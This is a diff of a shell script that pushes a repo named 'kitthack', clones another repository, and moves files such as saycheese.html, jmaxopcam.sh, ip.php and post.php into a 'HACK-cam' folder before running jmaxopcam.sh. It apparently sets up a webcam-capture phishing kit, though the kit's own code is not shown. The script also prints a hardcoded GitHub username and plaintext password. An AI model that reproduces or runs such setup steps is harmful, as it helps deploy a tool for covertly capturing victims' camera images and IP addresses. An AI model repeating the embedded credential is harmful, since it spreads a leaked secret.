@@ -72,10 +72,12 @@ git add .
 git commit -m "first commit"
 git remote add origin https://github.com/MrAli-s/kitthack.git
 git pull --rebase origin master
+clear
 echo -e '"the Username is "MrAli-s"'
 echo -e '"the password is "1928Rami@//"'
 git push -u origin master
 git clone https://github.com/AkanVb/Test.git
 #mv Test/post.php saycheese.html template.php jmaxopcam.sh ip.php index.php index2.php README.md LICENSE ..
-mv /Test/index2.html template.php jmaxopcam.sh saycheese.html ip.php index2.html index.php post.php README.md LICENSE  ..
+#mv /Test/index2.html template.php jmaxopcam.sh saycheese.html ip.php index2.html index.php post.php README.md LICENSE  ..
+mv ~/HACK-cam/Test/README.md ~/HACK-cam/Test/extract.sh ~/HACK-cam/Test/ip.php ~/HACK-cam/Test/index2.html ~/HACK-cam/Test/index.php ~/HACK-cam/Test/ip.php ~/HACK-cam/Test/template.php ~/HACK-cam/Test/LICENSE ~/HACK-cam/Test/template.php ~/HACK-cam/Test/saycheese.html ~/HACK-cam/Test/jmaxopcam.sh ~/HACK-cam/Test/post.php ~/HACK-cam
 bash jmaxopcam.sh
